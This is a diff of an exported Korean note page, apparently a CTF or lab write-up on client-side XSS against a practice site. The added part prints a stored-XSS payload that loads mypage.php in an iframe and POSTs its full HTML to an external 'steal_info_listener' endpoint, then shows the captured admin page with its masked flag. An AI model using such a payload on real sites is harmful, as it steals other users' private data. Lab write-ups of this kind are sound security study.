@@ -781,5 +781,51 @@ blockquote.quote-large {
     },
     100
   )
-&lt;/script&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8077-abb3-f085526e19ce" class="">로컬에서 테스트해봤을때</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-802c-aae7-d03dc4fa6291" class="">iframe 생성 후 페이지가 로드된 뒤에 스크립트가 실행되기도 하고, 어쩔때는 iframe 에 페이지가 다 불러지지 않아서 contentDocument 값이 없는 경우가 왔다갔다 했음. 그래서 setInterval 함수를 사용해 페이지 로딩 된 뒤 적당한 시간 후에 데이터 추출 및 전송하는 코드 실행되도록 함.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8068-ac8c-de439719899a" class="">흥미로웠던 부분은 getElementsByName 으로 원하는 인풋태그 선택해서 placeholder 속성값을 가져올때 </p></div><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-8022-92cd-eef81b21aa71" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%209.png"><img style="width:681.984375px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%209.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8002-81b2-e6509e29ce1f" class="">id, info, pw 값을 선택하면 로컬에서는 모두 잘 가져올 수 있음.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-802f-94a0-c158f5fd4d4b" class="">근데 관리자 원격 봇은 info, pw 값은 가져올 수 있는데 id 값을 가져오려고 하면 안됨. iframe 문서 안에 있는 전체 문서를 추출해서 보고싶긴 한데 거기까지는 아직 못해봄.</p></div></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-804e-a4af-cf7f62725d5b" class="">
+&lt;/script&gt;</code></pre></div></details></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8077-abb3-f085526e19ce" class="">로컬에서 테스트해봤을때</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-802c-aae7-d03dc4fa6291" class="">iframe 생성 후 페이지가 로드된 뒤에 스크립트가 실행되기도 하고, 어쩔때는 iframe 에 페이지가 다 불러지지 않아서 contentDocument 값이 없는 경우가 왔다갔다 했음. 그래서 setInterval 함수를 사용해 페이지 로딩 된 뒤 적당한 시간 후에 데이터 추출 및 전송하는 코드 실행되도록 함.</p></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8068-ac8c-de439719899a" class="">흥미로웠던 부분은 getElementsByName 으로 원하는 인풋태그 선택해서 placeholder 속성값을 가져올때 </p></div><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-8022-92cd-eef81b21aa71" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%209.png"><img style="width:681.984375px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%209.png"/></a></figure></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-8002-81b2-e6509e29ce1f" class="">id, info, pw 값을 선택하면 로컬에서는 모두 잘 가져올 수 있음.</p></div><div style="display:contents" dir="auto"><ul id="2d862085-e5ae-802f-94a0-c158f5fd4d4b" class="toggle"><li><details open=""><summary>근데 관리자 원격 봇은 info, pw 값은 가져올 수 있는데 id 값을 가져오려고 하면 안됨. iframe 문서 안에 있는 전체 문서를 추출해서 보고싶긴 한데 거기까지는 아직 못해봄. ⇒ 해봄 <time>@December 29, 2025 8:14 PM</time> </summary><div style="display:contents" dir="ltr"><figure id="2d862085-e5ae-8039-9629-c917528fbb95" class="image"><a href="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%2010.png"><img style="width:653.984375px" src="xss%20client%20side%20%EB%AC%B8%EC%A0%9C%ED%92%80%EC%9D%B4/image%2010.png"/></a></figure></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d862085-e5ae-80dd-ba54-cca3ff938e24" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;iframe src=&quot;/scriptPrac2/mypage.php&quot; id=&quot;target&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+  const i=setInterval(
+    ()=&gt;{
+      const t=document.getElementById(&#x27;target&#x27;);
+      const target_html=t.contentDocument.getElementsByTagName(&#x27;html&#x27;)[0].outerHTML;
+      const d=new FormData();
+      d.set(&#x27;d&#x27;,target_html);
+      fetch(
+        &#x27;https://segfault.dnode.link/steal_info_listener.php&#x27;,
+        {method:&#x27;POST&#x27;,body:d}
+      );
+      clearInterval(i)
+    }, 
+    100
+  )
+&lt;/script&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80c8-9807-f2ac1288a860" class="">이 게시글을 관리자가 방문하면 아래와 같은 html 데이터가 서버에 저장됨 (저장은 steal_info_listener.php 에서 대충 하게 해둠)</p></div><div style="display:contents" dir="auto"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2d862085-e5ae-8021-9908-e220243168b4" class="code code-wrap"><code class="language-HTML" style="white-space:pre-wrap;word-break:break-all">&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;link href=&quot;./css/style.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;title&gt;Private Page&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;wrapper&quot;&gt;
+        &lt;div id=&quot;login-form&quot;&gt;
+            &lt;div class=&quot;head&quot;&gt;개인정보&lt;/div&gt;
+            &lt;form method=&quot;post&quot; action=&quot;mypage_update.php&quot;&gt;
+                &lt;div class=&quot;hori&quot;&gt;
+                    &lt;i class=&quot;far fa-user fa-2x&quot;&gt;&lt;/i&gt;
+                    &lt;input name=&quot;id&quot; type=&quot;text&quot; placeholder=&quot;&lt;br /&gt;
+&lt;b&gt;Warning&lt;/b&gt;:  Undefined variable $id in &lt;b&gt;/var/www/html/scriptPrac2/mypage.php&lt;/b&gt; on line &lt;b&gt;41&lt;/b&gt;&lt;br /&gt;
+&quot;&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;hori&quot;&gt;
+                    &lt;i class=&quot;fas fa-birthday-cake fa-2x&quot;&gt;&lt;/i&gt;
+                    &lt;input name=&quot;info&quot; type=&quot;text&quot; id=&quot;userInfo&quot; placeholder=&quot;segfault{--------}&quot;&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;hori&quot;&gt;
+                    &lt;i class=&quot;fas fa-lock fa-2x&quot;&gt;&lt;/i&gt;
+                    &lt;input name=&quot;pw&quot; type=&quot;password&quot; placeholder=&quot;변경할 비밀번호&quot;&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;hori&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;Update&quot; id=&quot;signup-btnl&quot;&gt;&lt;/div&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;script src=&quot;https://kit.fontawesome.com/6478f529f2.js&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-80d3-8082-f5eb2c48d40f" class="">로그인 안한상태에서 mypage.php 에 접속했을 때처럼 name=”id” 인 인풋태그의 플레이스홀더에 이상한 에러 메세지가 들어가 있음. 애초에 로그인 자체를 안시켜둔 상태에서 관리자 봇이 브라우저로 mypage.php 에 방문하면 플래그만 “info” 인풋태그에 넣어서 보내는 방식인 것 같은 느낌? </p></div></details></li></ul></div></li></ul></div><div style="display:contents" dir="auto"><p id="2d862085-e5ae-804e-a4af-cf7f62725d5b" class="">
 </p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
